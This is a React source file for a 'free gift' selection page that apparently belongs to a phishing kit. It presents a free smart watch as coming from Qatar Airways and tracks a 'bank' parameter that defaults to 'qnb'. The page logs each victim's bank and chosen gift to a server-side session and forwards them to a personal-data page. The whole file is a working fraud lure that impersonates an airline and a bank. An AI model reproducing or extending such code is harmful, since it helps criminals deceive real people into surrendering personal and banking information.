import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import Header from "@/components/Header";

const sliderImages = [
  "https://i.ibb.co/prbY7X4y/IMG-20260718-WA0011.jpg",
  "https://i.ibb.co/hRZYJfHN/IMG-20260718-WA0010.jpg",
  "https://i.ibb.co/LDBRJyyS/IMG-20260718-WA0009.jpg",
  "https://i.ibb.co/SXj5mWQR/IMG-20260718-WA0008.jpg",
  "https://i.ibb.co/PzVjfnr0/IMG-20260718-WA0007.jpg",
  "https://i.ibb.co/NgqDV0LF/IMG-20260718-WA0006.jpg",
  "https://i.ibb.co/rKNQp5t5/IMG-20260718-WA0005.jpg",
  "https://i.ibb.co/mCNvcQ2s/IMG-20260718-WA0001.jpg",
  "https://i.ibb.co/gMWpGhwT/IMG-20260718-WA0002.jpg",
  "https://i.ibb.co/ycrZw6z1/IMG-20260718-WA0003.jpg",
  "https://i.ibb.co/FPSMwx7/IMG-20260718-WA0004.jpg",
  "https://i.ibb.co/BH4fNcs0/h2-uefa-2024.jpg",
  "https://i.ibb.co/2707Nb2Z/h2-jet-ski-qatar.jpg",
  "https://i.ibb.co/fzZ25gZW/h2-f1-v2.jpg",
  "https://i.ibb.co/s9w4ZzdB/PHL.jpg",
  "https://i.ibb.co/x8Kq5Nfr/h2-visa-cug-china.jpg",
];

const gifts = [
  { id: 1, img: "https://i.ibb.co/JW8Fdgwh/IMG-20260717-WA0013.jpg" },
  { id: 2, img: "https://i.ibb.co/S4YFyh3V/IMG-20260717-WA0012.jpg" },
  { id: 3, img: "https://i.ibb.co/TMQ0vQyD/IMG-20260717-WA0005.jpg" },
  { id: 4, img: "https://i.ibb.co/7NZQJyrg/IMG-20260717-WA0006.jpg" },
  { id: 5, img: "https://i.ibb.co/8C6CSDC/IMG-20260717-WA0007.jpg" },
  { id: 6, img: "https://i.ibb.co/p6dsL6FK/IMG-20260717-WA0000.jpg" },
  { id: 7, img: "https://i.ibb.co/WwKJw2p/IMG-20260717-WA0001.jpg" },
  { id: 8, img: "https://i.ibb.co/jP5j6vND/IMG-20260717-WA0008.jpg" },
  { id: 9, img: "https://i.ibb.co/DfxJ4DFn/IMG-20260717-WA0009.jpg" },
  { id: 10, img: "https://i.ibb.co/gFdfDm91/IMG-20260717-WA0002.jpg" },
  { id: 11, img: "https://i.ibb.co/0jbg1DN6/IMG-20260717-WA0003.jpg" },
  { id: 12, img: "https://i.ibb.co/pvHk4YxJ/IMG-20260717-WA0010.jpg" },
  { id: 13, img: "https://i.ibb.co/XZpGpGNb/IMG-20260717-WA0011.jpg" },
  { id: 14, img: "https://i.ibb.co/Q3VtVs4Q/IMG-20260717-WA0004.jpg" },
];

export default function GiftSelection() {
  const [, setLocation] = useLocation();
  const { language } = useLanguage();
  const isArabic = language === "ar";
  const [selectedGift, setSelectedGift] = useState<number | null>(null);
  const [currentSlide, setCurrentSlide] = useState(0);

  useEffect(() => {
    const timer = setInterval(() => {
      setCurrentSlide((prev) => (prev + 1) % sliderImages.length);
    }, 5000);
    return () => clearInterval(timer);
  }, []);

  const searchParams = new URLSearchParams(window.location.search);
  const bank = searchParams.get("bank") || "qnb";
  const session = searchParams.get("session") || "";

  const reportStepMutation = trpc.submissions.reportStep.useMutation();
  const createSessionMutation = trpc.submissions.createSession.useMutation();

  const handleGiftSelect = async (id: number) => {
    setSelectedGift(id);
    localStorage.setItem("selectedGift", id.toString());
    
    try {
      const currentSessionId = session || localStorage.getItem("sessionId") || "";
      
      // تحديث الجلسة والانتظار لضمان الحفظ قبل الانتقال
      await createSessionMutation.mutateAsync({
        sessionId: currentSessionId,
        selectedBank: bank,
        selectedGift: `Smart Watch Gift #${id}`
      });
      
      // الانتقال بعد التأكد من الحفظ
      setLocation(`/personal-data?bank=${bank}&session=${currentSessionId}&gift=${id}`);
    } catch (error) {
      console.error("Error updating session with gift:", error);
      // انتقال احتياطي حتى لو فشل التحديث لضمان عدم توقف العميل
      setLocation(`/personal-data?bank=${bank}&session=${session}&gift=${id}`);
    }
  };

  return (
    <div className="min-h-screen bg-slate-50 flex flex-col" dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        .gift-container { padding: 20px; text-align: center; }
        .gift-title { font-size: 22px; font-weight: bold; color: #333; margin-bottom: 10px; }
        .gift-subtitle { font-size: 16px; color: #8C0032; margin-bottom: 30px; font-weight: 600; }
        .gift-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; width: 100%; margin: 0 auto; }
        .gift-item { background: white; border-radius: 15px; padding: 10px; border: 2px solid transparent; transition: all 0.3s ease; cursor: pointer; position: relative; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }
        .gift-item.selected { border-color: #8C0032; box-shadow: 0 8px 20px rgba(140, 0, 50, 0.15); }
        .gift-img { width: 100%; height: auto; border-radius: 10px; }
        .selection-check { position: absolute; top: 5px; right: 5px; background: #8C0032; color: white; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 12px; z-index: 5; }
        .select-btn { margin-top: 15px; background: #8C0032; color: white; border: none; padding: 8px 15px; border-radius: 20px; font-size: 13px; font-weight: bold; width: 100%; }
      `}</style>
      
      <Header />
      
      {/* Slider Banner */}
      <div style={{ width: '100%', position: 'relative', height: '300px', overflow: 'hidden', display: 'flex', alignItems: 'center', justifyContent: 'center' }}>
        {sliderImages.map((image, index) => (
          <img 
            key={index}
            src={image} 
            style={{ 
              width: '100%', 
              height: '100%', 
              objectFit: 'cover', 
              position: 'absolute', 
              top: 0, 
              left: 0, 
              zIndex: 1, 
              transition: 'opacity 1.5s ease-in-out',
              opacity: currentSlide === index ? 1 : 0
            }}
            alt="Banner"
          />
        ))}
        <div style={{ position: 'absolute', top: 0, left: 0, width: '100%', height: '100%', background: 'rgba(0,0,0,0.2)', zIndex: 2 }}></div>
      </div>
      
      <main className="flex-1 max-w-xl mx-auto w-full px-4 py-8">
        <div className="gift-container">
          <h1 className="gift-title">{isArabic ? "اختر هديتك المجانية" : "Choose Your Free Gift"}</h1>
          <p className="gift-subtitle">{isArabic ? "ساعة ذكية هدية مجانية من القطرية للطيران" : "A free smart watch gift from Qatar Airways"}</p>
          
          <div className="gift-grid">
            {gifts.map((gift) => (
              <div 
                key={gift.id} 
                className={`gift-item ${selectedGift === gift.id ? 'selected' : ''}`}
                onClick={() => handleGiftSelect(gift.id)}
              >
                {selectedGift === gift.id && <div className="selection-check">✔</div>}
                <img src={gift.img} className="gift-img" alt={`Gift ${gift.id}`} />
                <button className="select-btn">
                  {isArabic ? "اختيار هذه الهدية" : "Select This Gift"}
                </button>
              </div>
            ))}
          </div>
        </div>
      </main>

      <footer className="mt-auto">
        <div className="footer-image-container">
          <img 
            src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} 
            className="footer-image-standard" 
            alt="Footer" 
          />
        </div>
      </footer>
    </div>
  );
}
